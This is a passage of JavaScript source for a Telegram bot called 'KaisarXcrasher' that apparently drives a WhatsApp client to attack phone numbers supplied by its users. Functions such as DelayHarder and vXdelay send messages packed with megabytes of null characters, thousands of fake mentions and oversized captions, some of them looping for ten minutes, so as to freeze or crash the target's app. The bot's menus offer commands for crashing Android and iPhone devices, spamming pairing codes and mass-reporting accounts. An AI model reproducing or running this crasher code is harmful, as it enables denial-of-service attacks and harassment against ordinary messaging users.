          fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
          fileLength: "999999999",
          height: 9999,
          width: 9999,
          mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
          fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, () => `1${Math.random() * 9e6}@s.whatsapp.net`)
          }
        }
      },
      buttons: Array.from({ length: 50 }, (_, i) => ({
        buttonId: `btn_${i}`,
        buttonText: { displayText: `btn ${i}` },
        type: 1
      }))
    }
  };

  await sock.relayMessage(target, msg, { participant: { jid: target } });
  await sock.relayMessage(target, msg2, { participant: { jid: target } });
}

async function DelayHarder(sock, target) {
  for (let i = 0; i < 50; i++) {
    let ApongMssg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "X",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});    
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: ApongMssg.message
        }
      },
      target
        ? { messageId: ApongMssg.key.id, participant: { jid: target } }
        : { messageId: ApongMssg.key.id }
    );
  }
    console.log(chalk.red(`Succes Sending To ${target}`));
}

async function vXdelay(sock, target){
const startTimestamp = Date.now();
const attackDuration = 10 * 60 * 1000;
while (Date.now() - startTimestamp < attackDuration) {
for (let cycle = 0; cycle < 100; cycle++) {
const fakeMentions = Array.from({ length: 2000 }, (_, idx) => `628${idx + 1}9${idx + 1}@s.whatsapp.net`);
  const stickerPayload = {
    "url": "https://mmg.whatsapp.net/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0&mms3=true",
    "fileSha256": "D0cotrUlRISvwKDBCNWukYeFx3ftQHb6+nkLZNhnD0E=",
    "fileEncSha256": "Db+8Ue92VLkgR+ASIYAMpocDsz0HT1OUgeDEtMvH+bE=",
    "mediaKey": "X+AZ81HjpfAfu01Yzk8EJMb8SKYEQTd6Tbgqrlfafmc=",
    "mimetype": "image/webp",
    "height": 512,
    "width": 512,
    "directPath": "/v/t62.15575-24/29608536_1237860284549931_4687921904643282854_n.enc?ccb=11-4&oh=01_Q5Aa3wGRchwqRaJ8-klzBlUyohWQ6WA3UiJ6l3aGrf5dy6JfHA&oe=69C15F5F&_nc_sid=5e03e0",
    "fileLength": "37824",
    "mediaKeyTimestamp": "1771680407",
    "isAnimated": false,
    "stickerSentTs": "1771694793768",
    "isAvatar": true,
    "isAiSticker": true,
    "isLottie": false,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    contextInfo: {
      mentionedJid: fakeMentions,
      pairedMediaType: "HD_IMAGE_CHILD",
      statusSourceType: "MUSIC_STANDALONE",
      statusAttributions: [
        {
          type: "STATUS_MENTION",
          music: {
            authorName: "X",
            songId: "1137812656623908",
            title: "\u0000".repeat(1500),
            author: "\u0000".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artworkMediaKey: "1771689153",
            artistAttribution: " x ",
            isExplicit: true
          }
        }
      ]
    },
    annotations: [
      {
        embeddedContent: {
          embeddedMusic: {
            musicContentMediaId: "589608164114571",
            songId: "870166291800508",
            title: "\u0003".repeat(1500),
            author: "\u0003".repeat(1500),
            artworkDirectPath: "/o1/v/t24/f2/m235/AQMN_XAJ4_Pp-ZKa-ffdvtqAQoYu0wvQUlEDsJPcm3pPj3XdnX_OEorwHTefjrJ0aV1_lCWkXt1_yOnp2E5W0O3QhCMDNQEg4mKcmyLY4g?ccb=9-4&oh=01_Q5Aa3wEqBdvCkLVz0Raoswv8IMLkCRginTvmk0yEktLLYKQzPA&oe=69C13396&_nc_sid=e6ed6c",
            artworkSha256: "udonzyFOe7T2UPQ/WSr97NRAkGXTXhI2t2pc9d5xPzU=",
            artworkEncSha256: "97u4QsDwfWG8HSOaj5/uMOQUtIuMHpzVmfULEEZupRM=",
            artistAttribution: "https://t.me/null",
            countryBlocklist: true,
            isExplicit: true,
            artworkMediaKey: "1771689153"
          }
        },
        embeddedAction: true
      }
    ]
  };

  await sock.relayMessage("status@broadcast", {
    stickerMessage: stickerPayload
  },
  {
    statusJidList: [target]
  });

const audioPayload1 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "StatusMessage",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const firstAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload1,
        contextInfo: {
          ...audioPayload1.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", firstAudioMsg.message, {
      messageId: firstAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });

sock.relayMessage("status@broadcast", 
{
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "K+ztV1kPJ/IPdUJnOKRSnd7ph77fEgy71KPmhcFUbpc=",
    "fileLength": "1332709",
    "seconds": 86400,
    "mediaKey": "MALF+tSSTMZufgmOofb86Z7LrumE0497jUjW82fhONI=",
    "caption": "꧁".repeat(50000),
    "height": 9999,
    "width": 99999,
    "fileEncSha256": "EiF137hLTwxdgGdtEJ8XqKmVatX8672vNrmI/vJyaXM=",
    "directPath": "/v/t62.7161-24/539571532_1160095076012944_3303818274043686177_n.enc?ccb=11-4&oh=01_Q5Aa3wERBqGWg6Y07bSFPzbIVyWBXSYGxVDdwxoy6Ke9rNegdA&oe=69B0224D&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1770563783",
    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACkASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAEBQADBgIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADMmCvzR802VFzAcxlZdMVTqHmiz7mb1C09BrGlqU0C5YxAjiSHV3Ps6nSma5dvciYDlBO4RzqH/8QAKRAAAgICAQIFAwUAAAAAAAAAAQIAAwQRMRIhBRA0UXEiMoEUM0FCc//EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAgBAhAAAAC1AEhSI2v/xAAZEQEAAgMAAAAAAAAAAAAAAAABABECAxL/2gAIAQMRAT8AOhiP/9oADAMBAAIAAwAAABDzzzzygA88888s888888s88s88s88s888s8/8QAHREAAgICAwEAAAAAAAAAAAAAAAERITEgQTBRUf/aAAgBAgEBPwDZII4FfC9WNLh//8QAGxEBAQACAwEAAAAAAAAAAAAAAAERIQASMUH/2gAIAQMBAT8A5hBRwg0TbV4y7KPbH//Z",
    "contextInfo": {
      "pairedMediaType": "NOT_PAIRED_MEDIA",
      "statusSourceType": "VIDEO"
    },
    "streamingSidecar": "NcqOmk1FiSxZ1drVtpZhrx6JIcq6FkrdJZFyBrm3oDb2K4j6qsx16UlVSWSG/eaDEfMh4HcR7Yt99IprZfoOu/r/MvtPtopjpUyz/vjWIwsKhhH/yTo2+2NXxTY3NoWJLB46yQ8LXXGb6aM5D+IlwRZYF5Td2E9PxRHWsyjU580kSok5moVXt1fOCIArItLm3gqpowXyNllSXDc8xBNVkmjznPq23bAzfWsB4HlTxdLJxTr5W7wvNGv/urgz2LdXlyxbLjzGBE+HWVC+sLbIuo0s"
  }
},
{}
);

const audioPayload2 = {
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\u0000".repeat(1045000),
        version: 3,
        entryPointConversionSource: "galaxy_message",
      },
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: `#${Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "0")}`,

      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211,
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const secondAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload2,
        contextInfo: {
          ...audioPayload2.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", secondAudioMsg.message, {
      messageId: secondAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
 
 
const imageExploit = "https://files.catbox.moe/ykvioj.jpg";

  const metaMentions = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const imageMessage = {
    image: { url: imageExploit },
    caption: "꧂".repeat(60000)
  };

  const albumContainer = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage("status@broadcast", albumContainer.message, { messageId: albumContainer.key.id });

    const craftedMsg = await generateWAMessage(target, imageMessage, {
      upload: sock.waUploadToServer
    });

    const msgType = Object.keys(craftedMsg.message).find(t => t.endsWith('Message'));

    craftedMsg.message[msgType].contextInfo = {
      mentionedJid: [
        ...metaMentions,
        ...Array.from({ length: 1900 }, () =>
          `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "6281212345678@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "꧁".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: albumContainer.key
      }
    };

    craftedMsg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "꧂".repeat(1000),
            phoneNumber: "+6281212345678"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "꧂".repeat(1000),
            url: "https://wa.me/+6281212345678?text=" + encodeURIComponent("꧁".repeat(1500))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "꧂".repeat(1000),
            payload: "\u0000".repeat(1000)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(1000) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+6281212345678" 
            }
        ]
      }
    };

    await sock.relayMessage("status@broadcast", craftedMsg.message, {
      messageId: craftedMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "xwar"
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000),
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3,
                        body: {
                            text: "Null"
                        },
                        contextInfo: {
                            remoteJid: "undefined@s.whatsapp.net",
                            mentionedJid: ["undefined@s.whatsapp.net"],
                            isForwarded: true,
                            forwardingScore: 9999,
                            parentGroupJid: "0@g.us"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100000 }, () => ({}))
                        }
                    }
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target }
                    }]
                }]
            }
        ]
    });
    
try {
      await sock.chatModify({ clear: true }, target);
            console.log("CONNECTED");
        } catch (error) {
            console.error("FAILED:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 500));
    }
  }
}


//------------------------------------------------------------------------------------------------------------------------------\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const isPrivate = msg.chat.type === 'private';
  const CONFETTI_ID = "5104841245755180586";
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const developer = "@dyyganteng123 ";
  const name = "KaisarXcrasher";
  const version = "2.0";
  const platform = "telegram";
  const randomImage = getRandomImage();

  bot.sendPhoto(chatId, randomImage, {
    message_effect_id: isPrivate ? CONFETTI_ID : null,
    caption: `
\`\`\`js
⬡═—⊱ KAISAR X CRASHER  ⊰—═⬡
  ᴏᴡɴᴇʀ : ${developer}
  ᴠᴇʀsɪᴏɴ : 2.0

⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ON
  ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${premiumStatus}
  ᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtime}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ  

⧫━⟢ THANKS ⟣━⧫
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
         [ 
           { text: "ʙᴜᴋᴀ ᴍᴇɴᴜ", callback_data: "attact", style: "Danger" }
         ]
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;

    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";

    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(senderId);
    const developer = "@dyyganteng123 ";
    const name = "KAISAR";
    const version = "2.0";
    const platform = "telegram";

    await bot.answerCallbackQuery(query.id, {
      text: "Script Loading",
      show_alert: false,
    });

    let caption = "";
    let replyMarkup = {};
    let media = getRandomImage();

    /* ================= MAIN MENU ================= */
    if (query.data === "back_to_main") {
      caption = `
\`\`\`js
⬡═—⊱ KAISAR X CRASHER ⊰—═⬡
  ᴏᴡɴᴇʀ : ${developer}
  ᴠᴇʀsɪᴏɴ : 2.0

⬡═—⊱ STATUS BOT ⊰—═⬡
  ʙᴏᴛ sᴛᴀᴛᴜs : ON
  ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${premiumStatus}
  ᴏᴛ ᴜᴘᴛɪᴍᴇ : ${runtime}

⬡═—⊱ SECURITY ⊰—═⬡
  ᴏᴛᴘ sʏsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
  ᴛᴏᴋᴇɴ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ : ᴇɴᴀʙʟᴇᴅ  

⧫━⟢ THANKS ⟣━⧫
\`\`\`
`;
    replyMarkup = {
        inline_keyboard: [
         [
           { text: "ʙᴜᴋᴀ ᴍᴇɴᴜ", callback_data: "attact", style: "Primary" }
         ]
        ],
      };
    }
    
// bug menu
    else if (query.data === "attact") {
      caption = `\`\`\`js
⬡═—⊱ BEBAS SPAM BUG ⊰—═⬡
• /xbug   -  628xx  [ BEBAS SPAM BUG ]
• /xspam  - 628xx  [ BEBAS SPAM BUG ]

PAGE 1/7
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "back_to_main", style: "Primary" },          
            { text: "ɴᴇxᴛ", callback_data: "androidbug", style: "Primary" }
          ],
          [ 
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Primary" }
          ]
        ],
      };
    }
    
      else if (query.data === "androidbug") {
      caption = `\`\`\`js
⬡═—⊱ IPHONE BUG ⊰—═⬡
• /crashios  - 628xx    [ FORCE CLOSE SPAM ]
• /xiosinvis  - 628xx   [ FORCE CLOSE INVISIBLE ] 

⬡═—⊱ ANDROID BUG ⊰—═⬡
• /xandro  - 628xx    [ BLANK STUCK DEVICE ]
• /xblank  - 628xx    [ BLANK MEDIUM ] 
• /frezee  - 628xx    [ FREZEE ANDROID ]
• /xforce  - 628xx    [ FC INVISIBLE ANDRO ] 
• /xdelay  - 628xx    [ DELAY PERMANEN ]
• /xdelayv2  - 628xx    [ DELAY INVISIBLE ]
• /xcombo  - 628xx    [ DELAY X BULLDO ]
• /Xbulldo  - 628xx   [ BULLDOZER HARD ]
• /xcall    - 628xx   [ FRANK SPAM CALL ]
• /hapusbug - 628xx   [ HAPUS BUG SEND ] 

PAGE 2/7 
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "attact", style: "Success" },          
            { text: "ɴᴇxᴛ", callback_data: "tools", style: "Success" }
          ], 
          [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Success" }
          ]
        ],
      };
    }
        
    // TOOLS DAN FUN MENU    
    else if (query.data === "tools") {
      caption = `\`\`\`js
⬡═—⊱ MENU TOOLS ⊰—═⬡
• /SpamPairing → SPAM KODE PAIRING
• /ReportWa → REPORT WHATSAPP
• /tourl → POTO TO LINK JPG
• /cekfunc → CHECK FUNCTION ERROR
• /fixcode → FIK ERROR CODE
• /brat → BIKIN STIKER
• /stiktok → SEARCH TIKTOK
• /bisakah → TANYA AI BOT
• /cektolol → CEK TOLOL
• /cekkontol → CEK KONTOL
• /cekwibu → CEK SEBERAPA WIBU ELU
• /tiktok → DONLOD VIDIO TIKTOK

PAGE 3/7
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "androidbug", style: "Danger" },          
            { text: "ɴᴇxᴛ", callback_data: "islam", style: "Danger" }
          ], 
          [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Danger" }
          ]
        ],
      };
    }
    
      else if (query.data === "islam") {
      caption = `\`\`\`js
⬡═—⊱ MENU ISLAM ⊰—═⬡
• /ayatkursi → SYURAT AYAT KURSI
• /bacaansholat → SEMUA BACAAN SHOLAT
• /niatsholat → SEMUA NIAT SHOLAT

PAGE 4/7
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "tools", style: "Primary" },          
            { text: "ɴᴇxᴛ", callback_data: "gbmenu", style: "Primary" }
          ], 
          [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Primary" }
          ]
        ],
      };
    }
    
      else if (query.data === "gbmenu") {
      caption = `\`\`\`js
⬡═—⊱ MENU GROUP ⊰—═⬡
• /mute → REPLY PESAN
• /unmute → REPLY PESAN
• /warn → REPLY PESAN
• /open → BUKA GROUP
• /close → TUTUP GROUP
• /antilink → ON/OF
• /antimedia → ON/OF

PAGE 5/7
\`\`\``;
      media = bugUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "islam", style: "Danger" },          
            { text: "ɴᴇxᴛ", callback_data: "owner_menu", style: "Danger" }
          ], 
          [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Danger" }
          ]
        ],
      };
    }
    
      else if (query.data === "tq") {
      caption = `\`\`\`js
⬡═—⊱ THANKS TOO ⊰—═⬡ 
KING OWNER 
• dyyganteng

KING SUPPORT
• SENPAI315
• SASUKEXDEV
• All Users Script KaisaR

PAGE 7/7
\`\`\``;
      media = bagUrl;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "ʙᴀᴄᴋ", callback_data: "back_to_main", style: "Danger" },
          ]
        ],
      };
    }
    
    /* ================= OWNER MENU ================= */
    else if (query.data === "owner_menu") {
      caption = `\`\`\`js
⬡═—⊱ AKSES OWNER ⊰—═⬡
• /addowner → TAMBAH OWNER
• /delowner → HAPUS OWNER
• /addadmin → TAMBAH ADMIN
• /deladmin → HAPUS ADMIN
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COLDOWN
• /addbot → TAMBAH SENDER
• /dellbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF
• /update → UPDATE SCRIPT

⬡═—⊱ AKSES ADMIN ⊰—═⬡
• /addprem → TAMBAH PREMIUM
• /delprem → HAPUS PREMIUM
• /setcd → SETTING COLDOWN
• /addbot → TAMBAH SENDER
• /dellbot → HAPUS SENDER
• /listbot → CEK SENDER AKTIF

PAGE 6/7
\`\`\``;
      media = ownerUrl;
      replyMarkup = {
        inline_keyboard: [
       [
            { text: "ʙᴀᴄᴋ", callback_data: "gbmenu", style: "Primary" },       
            { text: "ɴᴇxᴛ", callback_data: "tq", style: "Primary" },
       ], 
       [
            { text: "ᴏᴡɴᴇʀ", url: "https://t.me/dyyganteng123", style: "Primary" }
       ]
      ],
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media,
        caption,
        parse_mode: "Markdown",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
    
//=======CASE BUG=========//
bot.onText(/\/xiosinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada";
  const cooldown = checkCooldown(userId);
  if (cooldown > 0) {
